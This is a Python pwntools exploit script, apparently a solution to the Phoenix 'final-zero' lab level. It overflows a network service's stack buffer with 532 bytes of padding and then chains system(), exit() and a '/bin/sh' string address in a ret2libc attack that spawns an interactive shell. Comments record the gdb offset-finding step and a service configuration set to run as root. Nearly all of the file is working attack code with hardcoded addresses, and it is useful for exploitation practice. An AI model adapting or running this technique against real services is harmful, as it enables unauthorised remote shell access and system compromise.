#!/usr/bin/python

from pwn import *

p = remote("localhost", 64013)
#p = process("/opt/phoenix/i486/final-zero")

def main():
	'''
	/etc/systemd/system
	Run daemon as root:
	
	[Service]
	Type=simple
	Restart=always
	#User=phoenix-i386-final-zero
	#User=phoenix-i386-final-zero
	User=root
	User=root
	'''

	# Skips prompt
	p.recvrepeat(0.2)

	'''
	0x41507341 in ?? ()
	gdb-peda$ pattern_offset 0x41507341
	1095791425 found at offset: 532
	'''
	log.info("Crafting payload")
	buf = "A" * 532
	
	# $4 = {<text variable, no debug info>} 0xf7fad824 <system>
	# $5 = {<text variable, no debug info>} 0xf7f7f543 <exit>
	# libc.so : 0xf7ff867a ("/bin/sh")

	system_addr = 0xf7fad824
	bin_sh_addr = 0xf7ff867a
	exit_addr = 0xf7f7f543

	#---------------#
	# 532 A's 	#
	#---------------#
	# system_addr   #
	#---------------#
	# exit_addr     #
	#---------------#
	# bin_sh_addr   #
	#---------------# 
	
	buf += p32(system_addr)
	buf += p32(exit_addr) # Graceful exit
	buf += p32(bin_sh_addr)

	p.sendline(buf) # Sends payload
	log.info("Payload sent!")
	p.interactive() # Pass interaction back to user

if __name__ == "__main__":
	main()
